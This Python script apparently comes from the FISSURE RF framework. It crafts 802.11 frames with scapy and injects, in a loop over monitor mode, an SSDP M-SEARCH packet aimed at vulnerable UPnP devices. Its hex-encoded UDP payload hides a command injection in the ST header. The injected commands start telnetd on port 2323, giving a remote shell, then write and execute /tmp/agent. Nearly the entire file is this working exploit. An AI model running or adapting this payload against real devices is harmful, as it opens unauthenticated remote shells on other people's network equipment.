#!/usr/bin/env python

import sys
from scapy.all import RadioTap,sendp,IP,UDP,LLC,SNAP

#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    iface = ""
    interval = "0.1"
    ap_mac = "abcdef123456"
    sta_source_mac = "aabbcc112233"
    sta_dest_mac = "abcdef123456"    
    type_subtype = "88"
    flags = "01"
    duration = "2C00"
    fragment_sequence = "E0EB"
    qos_control = "0000"
    udp_source_ip = "192.168.1.10"
    udp_dest_ip = "239.255.255.250"
    udp_source_port = "12345"
    udp_dest_port = "1900"
    udp_data = "4d2d534541524348202a20485454502f312e310d0a484f53543a3233392e3235352e3235352e3235303a313930300d0a53543a757569643a6074656c6e657464202d7020323332333b206563686f2022746f756368202f746d702f74657374223e2f746d702f6167656e743b2063686d6f64202b78202f746d702f6167656e743b202f746d702f6167656e74600d0a4d583a320d0a4d414e3a22737364703a646973636f766572220d0a0d0a"
    notes = 'While in monitor mode, injects a command via SSDP to a vulnerable UPnP device. Same as "UDP to AP QoS" in Packet Crafter.'
    
    arg_names = ['iface','interval','ap_mac','sta_source_mac','sta_dest_mac','type_subtype','flags','duration','fragment_sequence','qos_control','udp_source_ip','udp_dest_ip','udp_source_port','udp_dest_port','udp_data','notes']
    arg_values = [iface,interval,ap_mac,sta_source_mac,sta_dest_mac,type_subtype,flags,duration,fragment_sequence,qos_control,udp_source_ip,udp_dest_ip,udp_source_port,udp_dest_port,udp_data,notes]

    return (arg_names,arg_values)
    
#################################################

if __name__ == "__main__":

    # Default Values
    get_iface = ""
    interval = "0.1"
    ap_mac = "abcdef123456"
    sta_source_mac = "aabbcc112233"
    sta_dest_mac = "abcdef123456"    
    type_subtype = "88"
    flags = "01"
    duration = "2C00"
    fragment_sequence = "E0EB"
    qos_control = "0000"
    udp_source_ip = "192.168.1.10"
    udp_dest_ip = "239.255.255.250"
    udp_source_port = "12345"
    udp_dest_port = "1900"
    udp_data = "4d2d534541524348202a20485454502f312e310d0a484f53543a3233392e3235352e3235352e3235303a313930300d0a53543a757569643a6074656c6e657464202d7020323332333b206563686f2022746f756368202f746d702f74657374223e2f746d702f6167656e743b2063686d6f64202b78202f746d702f6167656e743b202f746d702f6167656e74600d0a4d583a320d0a4d414e3a22737364703a646973636f766572220d0a0d0a"
    
    # Accept Command Line Arguments
    try:
        get_iface = sys.argv[1]
        interval = sys.argv[2]
        ap_mac = sys.argv[3]
        sta_source_mac = sys.argv[4]
        sta_dest_mac = sys.argv[5]
        type_subtype = sys.argv[6]
        flags = sys.argv[7]
        duration = sys.argv[8]
        fragment_sequence = sys.argv[9]
        qos_control = sys.argv[10]
        udp_source_ip = sys.argv[11]
        udp_dest_ip = sys.argv[12]
        udp_source_port = sys.argv[13]
        udp_dest_port = sys.argv[14]
        udp_data = sys.argv[15]
    except:
        pass

#################################################
    
    # Run the Exploit    
    # Convert Hex to Hexstring Format ('00FF' --> '\x00\xFF')
    msg_data1 = (type_subtype + flags + duration + ap_mac + sta_source_mac + sta_dest_mac + fragment_sequence + qos_control).decode('hex')
    llc_bytes = LLC()/SNAP()   

    udp_bytes = IP()/UDP()
    udp_bytes[IP].src = udp_source_ip
    udp_bytes[IP].dst = udp_dest_ip
    udp_bytes[UDP].sport = int(udp_source_port)
    udp_bytes[UDP].dport = int(udp_dest_port)

    udp_data = udp_data.decode('hex')

    # Flag DS bits: 01 (From Ap), Addr1=Destination STA, Addr2=BSSID, Addr3=Source STA
    scapy_data = RadioTap()/msg_data1/llc_bytes/udp_bytes/udp_data
    sendp(scapy_data, iface=get_iface, inter=float(interval), loop=1)    
